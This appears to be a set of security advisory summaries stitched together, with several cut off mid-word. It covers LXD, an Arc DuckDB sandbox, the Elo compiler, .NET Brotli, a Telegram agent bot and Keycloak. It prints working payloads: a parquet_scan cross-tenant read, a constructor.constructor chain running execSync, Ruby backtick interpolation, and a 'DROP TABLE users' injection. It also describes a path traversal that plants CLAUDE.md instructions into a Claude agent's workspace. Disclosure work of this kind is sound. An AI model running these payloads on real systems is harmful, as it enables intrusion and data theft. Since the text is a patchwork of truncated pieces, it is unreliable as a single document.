`exists` is false for a newly added device, so `isDeviceAccessible` is the whole gate. It resolves to `newDevLXDDeviceAccessValidator` ([devlxd_instances.go:250](https://github.com/canonical/lxd/blob/d29ece6284a78e6c21d276be4e5fb6fef697c35e/lxd/devlxd_instances.go#L250)), which is `diskDeviceAllowed && filters.IsCustomVolumeDisk(device)`. `IsCustomVolumeDisk` ([lxd/device/filters/disk.go:28](https://github.com/canonical/lxd/blob/d29ece6284a78e6c21d276be4e5fb6fef697c35e/lxd/device/filters/disk.go#L28)) checks the device shape only: `type=disk`, non-empty `source`, non-empty `pool`. It never loads the `(pool, source)` volume or compares its owner to the caller.

The handler then sets `volatile.<dev>.devlxd.owner` to the caller and issues an in-process `PATCH` to `instancePatch` ([lxd/instance_patch.go:55](https://github.com/canonical/lxd/blob/d29ece6284a78e6c21d276be4e5fb6fef697c35e/lxd/instance_patch.go#L55)). That call skips the HTTP access handler and runs only project quota checks (`limits.AllowInstanceUpdate`, [instance_patch.go:215](https://github.com/canonical/lxd/blob/d29ece6284a78e6c21d276be4e5fb6fef697c35e/lxd/instance_patch.go#L215)) before `c.Update`. The disk device's `validateConfig` confirms the volume exists but does no ownership or RBAC check. A guest can therefore point a new disk device at any custom volume in its project and LXD mounts it. The recorded device owner becomes the attacker while the volume's `volatile.devlxd.owner` still names the victim.

### PoC

Built from source at HEAD `d29ece6284` (reports as `6.8`, API extension `devlxd_volume_management`); single host, `dir` pool, default project.

Host setup, two guests with separate DevLXD identities, each scoped to edit only its own instance:

```bash
lxc launch images:alpine/edge guesta -c security.devlxd=true -c security.devlxd.management.volumes=true
lxc launch images:alpine/edge guestb -c security.devlxd=true -c security.devlxd.management.volumes=true
lxc exec guesta -- apk add --no-cache curl ; lxc exec guestb -- apk add --no-cache curl

for g in a b; do
  lxc auth identity create devlxd/id$g
  lxc auth group create g$g
  lxc auth group permission add g$g project default can_view
  lxc auth group permission add g$g project default can_view_storage_volumes
  lxc auth group permission add g$g project default can_create_storage_volumes
  lxc auth group permission add g$g instance guest$g can_view pr

### Summary

The fix for CVE-2026-47735 (released 2026.06.1) is incomplete. It added a DuckDB sandbox (`SET GLOBAL allowed_directories=[<storage root>]; SET GLOBAL enable_external_access=false`) and an Arc SQL-layer denylist of the **literal** functions `read_parquet(` and `arc_partition_agg(`. The sandbox correctly blocks reads **outside** the storage root (OS files, `http://` SSRF), but it allowlists the **entire multi-tenant storage root**, and the SQL denylist still misses the rest of the DuckDB I/O family the original advisory enumerated. As a result, any authenticated token — including one with `permissions: []` — can read or enumerate **every other database's data** within the deployment, defeating RBAC.

Verified at HEAD `c08b892` (`v26.06.1-36`, includes 26.06.2). Confirmed still live; no later commit blocks these functions.

### Root cause (three composing gaps)

1. **Sandbox scope is the whole storage root, not the tenant.** `internal/database/sandbox.go:111` allowlists `cfg.LocalStorageRoot` (default `storage.local_path=./data/arc`). Every database lives under it — `internal/storage/util.go:33` `GetStoragePath` => `<base>/<database>/<measurement>/**/*.parquet`. Any in-root path is sandbox-permitted regardless of which database owns it.
2. **RBAC never inspects table-valued functions.** `checkQueryPermissions` (`internal/api/query.go:1181`) extracts table refs via `extractTableReferences`, which skips any name followed by `(` as a function (`internal/api/query.go:1116`); with zero refs it returns allow (`:1213-1216`). So `parquet_scan(...)`, `glob(...)`, `parquet_metadata(...)`, `read_blob(...)`, `read_csv_auto(...)` are never authorization-checked.
3. **The SQL denylist matches only the literal spelling.** `userSQLReadParquetPattern` (`internal/api/query.go:2087`) is `\bread_parquet\s*\(`. DuckDB's documented alias **`parquet_scan(`** is not matched, and `read_csv_auto`/`read_json`/`read_text`/`read_blob`/`glob`/`parquet_metadata`/`parquet_schema` are not blocked anywhere. The fix author documented this very threat at `internal/api/query.go:2061-2064` (“a user scoped to db1.m1 could read /data/db2/secrets/**/*.parquet”) but blocked only the literal `read_parquet(`.

### Exploit (authenticated, any token incl. permissions:[])

```
POST /api/v1/query
Authorization: Bearer <token>
Content-Type: application/json
{"sql": "SELECT * FROM parquet_scan('./data/arc/<victim-db>/<measurement>/**/*.parquet')"}
```

- `ValidateSQLRequest` passes (`parquet_scan(` is not `read_parquet(`, not a dangerous keyword, single statement).
- `checkQueryPermissions` extracts 0 table refs (it is a function call) and allows.
- `convertSQLToStoragePaths` finds no `read_parquet` literal and no bare `FROM measurement` to rewrite, so the query passes through unchanged.
- DuckDB runs `parquet_scan('<root>/<victim-db>/...')`; the path is inside `allowed_directories`, so the other database's rows are returned.

`glob('./data/arc/**/*')` enumerates every database/measurement/file; `parquet_metadata(...)`/`parquet_schema(...)` leak column names and per-column min/max value statistics; `read_blob(...)` returns raw file bytes. All operate within the allowlisted root.

### Proof (poc/poc_sandbox_alias_bypass.py, poc/OUTPUT.txt)

Reproduces Arc's exact sandbox config (`allowed_directories=[<root>]`, `enable_external_access=false`) on DuckDB 1.5.x (Arc pins duckdb-go-bindings 1.5.1) with a victim parquet written under the root:

```
[BLOCKED ] read_blob OUTSIDE root            -> Permission Error: Cannot access file ...
[EXECUTES] parquet_scan victim (read_parquet ALIAS) -> [('tenant-VICTIM-row', 42)]
[EXECUTES] glob enumerate every db under root -> [('.../data/arc/victim-db/secrets/f.parquet',)]
[EXECUTES] parquet_metadata victim           -> [('leaked','tenant-VICTIM-row','tenant-VICTIM-row'), ('v','42','42')]
```

The sandbox blocks escape (as designed) but permits every in-root cross-database read.

### Impact

Cross-database / cross-tenant confidentia

Loading an attacker-supplied lemma `.pt` runs arbitrary code as the loading user. ### Summary

An unauthenticated attacker who controls a string passed to any Elo JavaScript-emission path — `defaultFormats.elo.parse()`, the `bin/elo` CLI, or the live browser playground at `elo-lang.org/try` — can execute arbitrary code in the host JavaScript runtime. A payload built from the `.constructor.constructor` chain compiles, without modification, to a live `Function` invocation in the emitted JavaScript, escaping any sandbox assumption around "Elo is a safe data/DSL language."

### Vulnerable sink and root cause

Three interacting sites in `src/` produce the bug at commit `749af7b`:

1. **`src/transform.ts:144–158`** — the `member_access` handler allows access on types `any`, `object`, or `array` without filtering the property name. This is the only place an integrator could have plugged a denylist.
2. **`src/compilers/javascript.ts:210`** — the JS emitter writes `${objectExpr}.${ir.property}` verbatim into the output, so any property name that survives the transform step flows unescaped into emitted JavaScript.
3. **`src/parser.ts:163–170, 748–750`** — the parser accepts `constructor` (and other JS meta-property names) as an ordinary identifier, so `.constructor` clears type-checking without triggering any warning.

Combined, the Elo expression `({}).constructor.constructor('…')()` compiles to a live `Function('…')()` call in the emitted JS, executing in the realm of whichever sink runs the compiled code.

### Attack surfaces

All three surfaces share the same root cause (no denylist in `transform.ts`) and are addressed by the same one-file patch:

| # | Entry point | Threat model |
|---|---|---|
| 1 | Browser playground — `https://elo-lang.org/try/?code=…&run=1` | **0-click XSS / account takeover** against elo-lang.org. `?run=1` triggers `setTimeout(() => this.run(), 100)` in `playground_controller.ts:531`; the server issues a 301 that preserves `?code=`. Any shared URL that contains a payload compromises the visitor's session on elo-lang.org. |
| 2 | `bin/elo` CLI | **RCE on CI / DevOps hosts.** Both `node bin/elo payload.elo` and `node bin/elo -e "_" -d @payload.elo -f elo` fire. The `-f elo` path is especially severe: the flag exists to pass user-supplied files as *data* into an Elo pipeline. No integrator expects a data-format flag to shell out to `/usr/bin/id`. |
| 3 | Library API — `defaultFormats.elo.parse()` | **Node.js RCE for any downstream integrator** using Elo as a rule engine, configuration DSL, or form builder DSL (the primary documented use cases). |

### Proof of Concept

**Common payload (works on all three entry points):**

```elo
({}).constructor.constructor('return this.constructor.constructor(\'return process\')().mainModule.require(\'child_process\').execSync(\'id\').toString()')()
```

**Library API** — `poc-minimal.js`:

```js
// npm install elo
const { defaultFormats } = require('elo');

const payload = "({}).constructor.constructor('return this.constructor.constructor(\\'return process\\')().mainModule.require(\\'child_process\\').execSync(\\'id\\').toString()')()";

console.log(defaultFormats.elo.parse(payload));
// → uid=1000(ultrasupara) gid=1000(ultrasupara) groups=…
```

**CLI** — `poc-cli.sh`:

```sh
node bin/elo payload.elo
# uid=1000(ultrasupara)…

node bin/elo -e "_" -d @payload.elo -f elo
# uid=1000(ultrasupara)…
```

**Browser playground** — 0-click XSS URL:

```

items.summary:
### Summary

Elo's Ruby backend emits attacker-controlled text into Ruby double-quoted strings without escaping the `#` character. Because `#` begins Ruby's interpolation sequences — `#{expr}`, `#@ivar`, `#@@cvar`, `#$gvar` — and any expression wrapped in `#{...}` may use backticks for shell execution, an Elo program that contains a crafted string literal or a labelled subtype constraint compiles to Ruby that evaluates attacker-chosen Ruby, and through backticks runs attacker-chosen shell commands, at runtime.

The same Elo source compiled to JavaScript, Python, or SQL is benign, so the bug also breaks the cross-target portability guarantee the rest of the compiler honours.

### Vulnerable sinks

Two sinks exist in `src/compilers/ruby.ts` at commit `749af7b`:

1. **String-literal emitter — lines 180–184.**
   The emitter escapes backslash, double quote, and control characters, but not `#`. Any `#{...}` sequence in an Elo string literal flows straight into the emitted Ruby source.

2. **Labelled subtype-constraint branch — lines 405–412.**
   The error message passed to `p_fail(p, "...")` is wrapped in a Ruby double-quoted string with no escape pass at all. Because the parser at `src/parser.ts:1339–1348` accepts single-quoted Elo strings as constraint labels, a label such as `'#{` `` `id` `` `}'` flows unchanged into the emitted Ruby.

### Attack surfaces

All three surfaces share the same root cause (the missing `#` escape in the Ruby double-quoted-string emission path) and are addressed by the same patch:

| # | Entry point | Threat model |
|---|---|---|
| 1 | `/try` playground on elo-lang.org (Ruby target) | 0-click server-side RCE against elo-lang.org infrastructure from a shared PoC URL |
| 2 | `bin/eloc -t ruby -x` on a CI or DevOps host | RCE on any host that passes Elo strings through the CLI |
| 3 | Library API — `defaultFormats.elo.parse()` with a Ruby emission step | Ruby RCE for any downstream integrator using Elo as a rule engine, configuration DSL, or form builder DSL (the primary documented use cases) |

### Proof of Concept

**String-literal sink:**

```
# poc.elo
'RES=#{`id 2>&1`}'
```

```
$ eloc -t ruby -x poc.elo
# emitted Ruby contains:  "RES=#{`id 2>&1`}"
# running it returns the output of id(1).
```

Replacing `` `id 2>&1` `` with `` `touch /tmp/pwned` `` produces a trivially observable filesystem side effect.

**Subtype-constraint label sink:**

```
# poc-subtype.elo
let X = Int(i | '#{`touch /tmp/pwned2`}': i > 0) in X(-1)
```

The predicate fails for `-1`, causing `p_fail(p, "#{...}")` to interpolate and execute the backtick command at the Ruby layer.

Both flows are automated in the reproduction script submitted with the original report and were verified against Ruby 3.x.

### Root cause

The Ruby-emitter's double-quoted-string escape routine omitted `#` from its character set, and one emission path (the subtype-constraint label branch) performed no escape pass at all.

### Summary

Elo's programmatic AST API accepts arbitrary values in many node fields without runtime type or syntax validation. Each backend's emit stage interpolates those values straight into the generated source with no escape pass. An integrator that populates the AST from JSON-deserialised input, plugin output, or any other untyped source therefore exposes a code-injection primitive that flows through to the emitted JavaScript, Ruby, Python, or SQL.

The same pattern was previously addressed in **0.9.7 (2026-01-27)**, which patched the date/datetime/duration literal emitters via `JSON.stringify()` after a report by **naoyashiga**. This advisory generalises that fix to the remaining AST surface — at least 23 emission sites across six node-field categories and four backends.

### Vulnerable sinks

Each row is a category of sinks that share the same shape: TypeScript signature erased at runtime → AST-API consumer passes a crafted value → emit interpolates the value verbatim.

| # | AST field | Affected backends | Resulting injection |
|---|---|---|---|
| 1 | `int_literal` / `float_literal` `.value` | JS, Ruby, Python, SQL | Arbitrary expression in the emitted numeric position (RCE on JS/Ruby/Python; SQL expression injection) |
| 2 | `variable.name` | JS, Ruby, Python, SQL | Identifier-position injection; on SQL, raw SQL injection because undefined identifiers are intentionally emitted as column references |
| 3 | `member_access.property` | JS, Ruby, Python, SQL | Property access escaped into expression (RCE) |
| 4 | `object_literal` key | JS, Ruby, SQL | Computed-key / extra-property injection (RCE on JS/Ruby; SQL injection) |
| 5 | `datapath` segment | JS, Ruby, Python, SQL | Ruby symbol-list injection allows backtick shell exec; SQL string-segment unquoted in single-quote context allows SQL injection |
| 6 | `lambda.params[].name` | JS, Ruby, Python | Parameter-list structural injection (RCE) |
| 7 | SQL `let` binding `name` | SQL | Identifier injection in `… AS <name>` clause |

### Proof of Concept

End-to-end execution was verified at commit `749af7b` for representative cases per backend. Examples:

**Numeric literal injection (all four backends).** Feeding the following AST through `compileToJavaScript` emits a live `console.log` on call:

```js
{ type: 'literal', value: "(console.log('PWN_INT_JS'),1)" }
// emits: (function(_) { return (console.log('PWN_INT_JS'),1); })(null);
```

The same AST against Ruby with `"(system('touch /tmp/pwn_int_ruby'); 1)"` creates the file; Python with `"(print('PWN_INT_PY') or 1)"` prints the sentinel; SQL emits the raw string into the numeric position.

**SQL `variable.name` injection:**

```js
{ type: 'variable', name: "1; DROP TABLE users; --" }
// emits: 1; DROP TABLE users; --
```

**Ruby `datapath` segment shell-exec:**

```js
{ type: 'datapath', segments: ["a, system(`touch /tmp/pwn_dp_ruby`)"] }
// emits: [:a, system(`touch /tmp/pwn_dp_ruby`)]
```

All ten end-to-end cases are automated in the `ast-exec.js` / `ast-exec2.js` scripts attached to the original report; each `console.log` and sentinel file was observed.

### Independence from GHSA #2

This finding is independent of **GHSA #2** (the `.constructor.constructor` sandbox escape). That report covers payloads delivered as plain Elo *strings* through the parser; the present advisory covers payloads delivered as AST *objects* through the programmatic API. The two threat models do not overlap: GHSA #2's identifier regex `^[a-zA-Z_][a-zA-Z0-9_]*$` accepts `constructor` (and is the right behaviour for a parser), while the present advisory adds runtime validation at every backend emit site so that AST-API consumers cannot inject arbitrary text into emitted source.

items.summary: ## Executive summary A buffer overflow vulnerability exists in the Brotli decompression library used by .NET. This vulnerability may allow an unauthenticated attacker to read or corrupt process memory. This could lead to information disclosure, denial of service, or elevation of privilege. ASP.NET Core and HttpClient do not automatically decompress Brotli data in their default configurations. Applications are exposed when they enable Brotli decompression or explicitly use Brotli decompression APIs to process attacker-controlled data, as described below. .NET Framework is not affected. ## Announcement Announcement for this issue can be found at https://github.com/dotnet/announcements/issues/494 ## CVSS Details - **Version:** 3.1 - **Severity:** High - **Score:** 8.1 - **Vector:** `CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H/E:U/RL:O/RC:C` - **Weakness:** CWE-787 (Out-of-bounds Write) ## Affected Platforms - **Platforms:** All - **Architectures:** All ## Mitigations ASP.NET Core request decompression and HttpClient automatic response decompression are not enabled by default. An application is not exposed merely because an affected .NET package is installed. Exposure requires the application to decompress attacker-controlled Brotli data through one of these paths: - Enable ASP.NET Core [automatic request decompression](https://learn.microsoft.com/aspnet/core/fundamentals/middleware/request-decompression) with Brotli (`br`) support. - Enable HttpClient automatic response decompression by configuring [HttpClientHandler.AutomaticDecompression](https://learn.microsoft.com/dotnet/api/system.net.http.httpclienthandler.automaticdecompression) or [SocketsHttpHandler.AutomaticDecompression](https://learn.microsoft.com/dotnet/api/system.net.http.socketshttphandler.automaticdecompression) to include [DecompressionMethods.Brotli](https://learn.microsoft.com/dotnet/api/system.net.decompressionmethods) or `DecompressionMethods.All`. - Explicitly use Brotli decompression APIs in `System.IO.Compression`, such as `BrotliStream` or `BrotliDecoder`. Until the update can be deployed, avoid decompressing attacker-controlled Brotli data. The following examples show how to disable Brotli decompression if you are already using it. > **Warning: Do not use these code snippets if you are not already using decompression.** Do not introduce a call to `AddRequestDecompression` if your application does not already call it. Similarly, do not introduce an `AutomaticDecompression` property assignment if your application does not already set that property. Modify only your existing decompression configuration. Enabling automatic decompression can introduce denial-of-service risks even when Brotli is excluded. If you are already using Brotli request decompression in ASP.NET Core, exclude it by removing the `br` entry from your existing decompression configuration. This retains the default gzip and deflate providers: ```csharp builder.Services.AddRequestDecompression(options => { options.DecompressionProviders.Remove("br"); }); ``` If your application already enables HttpClient automatic response decompression, disable Brotli by updating the flags on your existing handler so they do not include `DecompressionMethods.Brotli`: ```csharp var handler = new HttpClientHandler { AutomaticDecompression = DecompressionMethods.GZip | DecompressionMethods.Deflate }; var httpClient = new HttpClient(handler); ``` Applications that directly use Brotli decompression APIs must stop passing untrusted Brotli data to those APIs until updated. Ensure that other application code does not continue to decompress the same untrusted Brotli data. These changes can affect normal request and response handling and should be tested before deployment. Installing the security update remains the recommended fix. ## Affected Packages The vulnerability affects .NET applications using an affected Brotli decoder in the runtime or NativeAOT

items.summary:
### Impact

A remote Telegram user can write files to arbitrary paths inside an agent's persistent workspace volume (`praktor-wk-<workspace>`, mounted at `/workspace/agent`), escaping the documented `uploads/` directory.

The attacker controls the Telegram document filename, which was concatenated into the destination path without sanitization (`internal/telegram/bot.go`, at both upload sites) and resolved with `path.Join`, which collapses `../` sequences. A filename like `../../../CLAUDE.md` resolved to the root of the agent workspace volume, outside `uploads/`.

Because the agent workspace is the persistent working directory the Claude agent reads from and operates on across runs, writing outside `uploads/` lets an attacker plant or overwrite files the agent later consumes — e.g. `CLAUDE.md`, agent instruction/skill/hook files, or other config under `/workspace/agent`. This turns a file upload into a stored injection into the agent's instruction/execution surface (CWE-22 path traversal escalating to stored instruction injection).

### Reachability

By default the bot has no user allowlist (`allow_from: []` means "allow all"), so the only precondition is that a user can message the bot. No authentication or prior privilege is required.

### Affected versions

Through `v0.9.0` (and HEAD `3902d29`).

### Patched versions

`v0.9.1`, containing PR #228.

### Workarounds

Restrict `telegram.allow_from` to trusted user IDs to limit who can send uploads to the bot. Upgrading to `v0.9.1` is the recommended fix.

### Fix (defense in depth)

- `internal/telegram/bot.go`: apply `path.Base()` to the attacker-controlled filename at both upload sites, stripping directory components and `..`.
- `internal/container/manager.go`: `WriteVolumeBytes` now rejects any path that escapes `/vol` after `path.Join`, protecting future callers.

### Credit

Reported privately by [tonghuaroot](https://github.com/tonghuaroot), who provided a detailed root-cause analysis, a deployed end-to-end proof of concept against the real `container.Manager`, and fix verification.

### Description
A flaw was found in Keycloak. This JWT algorithm confusion vulnerability in the JWT Authorization Grant flow allows an attacker with valid client credentials to bypass signature verification. By forging an assertion, the attacker can create unauthorized access tokens. This enables the attacker to impersonate any federated user linked to the affected Identity Provider, leading to unauthorized access and potential privilege escalation.
